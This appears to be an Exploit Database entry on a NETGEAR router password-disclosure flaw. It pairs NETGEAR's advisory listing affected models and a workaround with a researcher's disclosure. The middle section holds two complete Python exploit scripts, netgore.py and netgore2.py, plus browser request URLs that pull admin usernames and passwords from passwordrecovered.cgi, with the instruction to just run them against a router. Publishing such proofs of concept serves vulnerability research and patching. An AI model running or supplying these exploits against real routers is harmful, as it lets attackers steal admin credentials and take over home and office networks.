people found this helpful in last 30 days

NETGEAR is aware of the security issue that can expose web GUI login passwords while the password recovery feature is disabled. This vulnerability occurs when an attacker can access the internal network or when remote management is enabled on the router. Remote management is turned off by default; users can turn on remote management through advanced settings.

Firmware fixes are currently available for the following affected devices. To download the firmware release that fixes the password recovery vulnerability, click the link for your model and visit the firmware release page for instructions:

* [R8500](https://kb.netgear.com/000036537/R8500-Firmware-Version-1-0-2-86)

NETGEAR has also released firmware that fixes the web password recovery vulnerability for the following cable modem router:

* C6300

For cable products, firmware is managed and released by your Internet service provider. The firmware fix for the C6300, firmware version 2.01.18, has been released to all service providers. Until your service provider releases the firmware fix to you, NETGEAR strongly recommends that you use the workaround procedure explained in this article. To see your C6300’s current firmware version, visit the following knowledge base article and follow the instructions: [How do I view the firmware version of my cable modem or modem router?](https://kb.netgear.com/25477/Current-firmware-version-for-NETGEAR-cable-modem-routers).

NETGEAR has tested the following devices and confirmed that they are *not* affected by the web password recovery vulnerability:

* V6510

For the following affected products, NETGEAR recommends using the workaround procedure explained in this article.

**Router Model and Firmware Version:**

* R6200 v1.0.1.56\_1.0.43
* R6300 v1.0.2.78\_1.0.58
* VEGN2610 v1.0.0.14\_1.0.12
* AC1450 v1.0.0.34\_10.0.16
* WNR1000v3 v1.0.2.68\_60.0.93
* WNDR3700v3 v1.0.0.38\_1.0.31
* WNDR4000 v1.0.2.4\_9.1.86
* WNDR4500 v1.0.1.40\_1.0.68

**DSL Gateway Model and Firmware Version:**

* D6300 v1.0.0.96
* D6300B v1.0.0.40
* DGN2200Bv4 v1.0.0.68
* DGN2200v4 v1.0.0.76

If your affected product does not have a firmware fix available, NETGEAR strongly recommends that you follow this workaround procedure to remediate the vulnerability:

1. Manually enable the password recovery feature on your device.

   For more information, visit [Configuring router administrative password recovery](https://kb.netgear.com/app/answers/detail/a_id/20027).
2. Ensure that remote management is disabled.

   Remote management is disabled by default. For more information, check the user manual for your product, which is available from <https://www.netgear.com/support/>.

The potential for password exposure remains if you do not complete both steps. NETGEAR is not responsible for any consequences that could have been avoided by following the recommendations in this notification.

Product description:
Multiple Netgear Routers

Many Netgear routers are prone to password disclosure via simple crafted
requests to the web management server. The bug is exploitable remotely if the
remote management option is set and can also be exploited given access to the
router over LAN or WLAN.

When trying to access the web panel a user is asked to authenticate, if the
authentication is cancelled and password recovery is not enabled, the user is
redirected to a page which exposes a password recovery token. If a user
supplies the correct token to the page
http://router/passwordrecovered.cgi?id=TOKEN (and password recovery is not
enabled), they will receive the admin password for the router.

If password recovery is set the exploit will fail, as it will ask the user for the recovery
questions which were previously set when enabling the feature, this is
persistent, even after disabling the recovery option the exploit will fail,
because the router will ask for the security questions.
This can easily be reproduced using the attached poc, or by sending these two
simple requests via the browser:
1. http://router/.../ will redirect you to http://router/..../unauth.cgi?id=TOKEN to acquire the token
2. http://router/passwordrecovered.cgi?id=TOKEN will give you credentials (some models require you to send a post request instead of get)

## netgore.py
import sys
import requests

def scrape(text, start_trig, end_trig):
    if text.find(start_trig) != -1:
	return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
    else:
        return "i_dont_speak_english"
#disable nasty insecure ssl warning
requests.packages.urllib3.disable_warnings()
#1st stage - get token
ip = sys.argv[1]
port = sys.argv[2]
url = 'http://' + ip + ':' + port + '/'
try:
	r = requests.get(url)
except:
	url = 'https://' + ip + ':' + port + '/'
	r = requests.get(url, verify=False)
model = r.headers.get('WWW-Authenticate')
if model is not None:
	print "Attcking: " + model[13:-1]
else:
	print "not a netgear router"
	sys.exit(0)
token = scrape(r.text, 'unauth.cgi?id=', '\"')
if token == 'i_dont_speak_english':
	print "not vulnerable"
	sys.exit(0)
print "token found: " + token
#2nd stage - pass the token - get the password
url = url + 'passwordrecovered.cgi?id=' + token
r = requests.post(url, verify=False)
#profit
if r.text.find('left\">') != -1:
	username = (repr(scrape(r.text, 'Router Admin Username</td>', '</td>')))
	username = scrape(username, '>', '\'')
	password = (repr(scrape(r.text, 'Router Admin Password</td>', '</td>')))
	password = scrape(password, '>', '\'')
	if username == "i_dont_speak_english":
		username = (scrape(r.text[r.text.find('left\">'):-1], 'left\">', '</td>'))
		password = (scrape(r.text[r.text.rfind('left\">'):-1], 'left\">', '</td>'))
else:
	print "not vulnerable becuse password recovery IS set"
	sys.exit(0)
#html encoding pops out of nowhere, lets replace that
password = password.replace("&#35;","#")
password = password.replace("&","&")
print "user: " + username
print "pass: " + password

================================
Just run the PoC against a router to get the credentials if it is vulnerable.

Many Netgear routers are prone to password disclosure via simple crafted
request to the web management server. The bug is exploitable remotely if the
remote management option is set and can also be exploited given access to the
router over LAN or WLAN.

Netgear routers have an option to restore forgotten password via 2 security
questions. If the recovery option is disabled (which is the default), it is
still possible to recover the password by sending a correct token to the
recovery page.

If a user supplies the correct token to the page
http://router/passwordrecovered.cgi?id=TOKEN (and password recovery is not
enabled), they will receive the admin password for the router. If password
recovery is set the exploit will fail, as it will ask the user for the recovery
questions which were previously set when enabling the feature, this is
persistent, even after disabling the recovery option, the exploit will fail,
because the router will ask for the security questions.

This mechanism does not work correctly on the very first request to
"passwordrecovered.cgi" and the token is not properly checked, this means that
any TOKEN value will result in disclosure of the password.
The issue occurs after every reboot of the router.

This can easily be reproduced using the attached poc, or by sending a simple
request via the browser:
1. http://router/passwordrecovered.cgi?id=Trustwave_SpiderLabs will give you credentials (some models require you to send a post request instead of get)

## netgore2.py
import sys
import requests

def scrape(text, start_trig, end_trig):
    if text.find(start_trig) != -1:
	return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
    else:
        return "i_dont_speak_english"
#disable nasty insecure ssl warning
requests.packages.urllib3.disable_warnings()
#1st stage
ip = sys.argv[1]
port = sys.argv[2]
url = 'http://' + ip + ':' + port + '/'
try:
	r = requests.get(url)
except:
	url = 'https://' + ip + ':' + port + '/'
	r = requests.get(url, verify=False)
model = r.headers.get('WWW-Authenticate')
if model is not None:
	print "Attcking: " + model[13:-1]
else:
	print "not a netgear router"
	sys.exit(0)
#2nd stage
url = url + 'passwordrecovered.cgi?id=get_rekt'
try:
	r = requests.post(url, verify=False)
except:
	print "not vulnerable router"
	sys.exit(0)
#profit
if r.text.find('left\">') != -1:
	username = (repr(scrape(r.text, 'Router Admin Username</td>', '</td>')))
	username = scrape(username, '>', '\'')
	password = (repr(scrape(r.text, 'Router Admin Password</td>', '</td>')))
	password = scrape(password, '>', '\'')
	if username == "i_dont_speak_english":
		username = (scrape(r.text[r.text.find('left\">'):-1], 'left\">', '</td>'))
		password = (scrape(r.text[r.text.rfind('left\">'):-1], 'left\">', '</td>'))
else:
	print "not vulnerable router, or some one else already accessed passwordrecovered.cgi, reboot router and test again"
	sys.exit(0)
#html encoding pops out of nowhere, lets replace that
password = password.replace("&#35;","#")
password = password.replace("&","&")
print "user: " + username
print "pass: " + password

================================
Just run the PoC against a router to get the credentials if it is vulnerable.

Remediation Steps:
Please see NETGEAR's KBA for list of firmware patches for various models. As a
workaround, the bug only works when password recovery is NOT set. If you do set
password recovery this is not exploitable.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
